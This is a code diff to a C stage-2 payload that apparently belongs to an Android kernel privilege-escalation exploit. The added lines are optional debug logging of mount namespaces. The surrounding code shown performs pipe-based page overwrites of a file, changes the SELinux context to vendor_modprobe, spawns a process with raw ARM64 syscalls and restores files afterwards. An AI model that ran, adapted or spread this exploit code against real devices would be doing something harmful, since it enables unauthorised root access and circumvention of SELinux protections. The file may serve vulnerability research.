@@ -38,6 +38,7 @@
 #include <sys/un.h>
 
 //#define STAGE2_DEBUG_LOG
+//#define STAGE2_MNT_DEBUG
 
 typedef unsigned long u64;
 
@@ -143,6 +144,13 @@ u64 mywaitid(int idtype, u64 id, void *infop, int options, void *ru) {
 	__asm__("mov x8, SYS_waitid\n");
 	return mysyscall(idtype, id, infop, options, ru);
 }
+
+#ifdef STAGE2_MNT_DEBUG
+u64 myreadlinkat(int dirfd, const char *path, char *buf, int bufsiz) {
+	__asm__("mov x8, SYS_readlinkat\n");
+	return mysyscall(dirfd, path, buf, bufsiz);
+}
+#endif
 
 static void prepare_pipe(struct global *global, int p[2])
 {
@@ -401,9 +409,19 @@ void c_entry() {
 		overwrite(global, p, fdmod, i * PAGE_SIZE + 1, (char*)next_payload + PAGE_SIZE * (i+1) + 1, PAGE_SIZE - 1);
 	}
 
+#ifdef STAGE2_MNT_DEBUG
+	char mntbuf[100];
+	myreadlinkat(0, "/proc/self/ns/mnt", mntbuf, sizeof(mntbuf) - 1);
+	lo(global, "mnt ns before clone ns=%s\n", mntbuf);
+#endif
+
 	u64 ret = myclone(SIGCHLD, NULL, NULL, 0, NULL);
 
 	if(ret == 0){
+#ifdef STAGE2_MNT_DEBUG
+		myreadlinkat(0, "/proc/self/ns/mnt", mntbuf, sizeof(mntbuf) - 1);
+		lo(global, "mnt ns child ns=%s\n", mntbuf);
+#endif
 		const char *selinux_context = "u:r:vendor_modprobe:s0";
 		int fdat = myopen("/proc/self/attr/exec", O_RDWR);
 		mywrite(fdat, selinux_context, mystrlen(selinux_context));
@@ -413,6 +431,11 @@ void c_entry() {
 
 		myexecve(argv[0], argv, NULL);
 	}else{
+#ifdef STAGE2_MNT_DEBUG
+		myreadlinkat(0, "/proc/self/ns/mnt", mntbuf, sizeof(mntbuf) - 1);
+		lo(global, "mnt ns parent ns=%s\n", mntbuf);
+#endif
+
 		lo(global, "Wait for child pid=%d\n", ret);
 		u64 ret2 = mywaitid(P_PID, ret, NULL, WEXITED, NULL);
 		lo(global, "waitid returned with %lu. Restore files.\n", ret2);
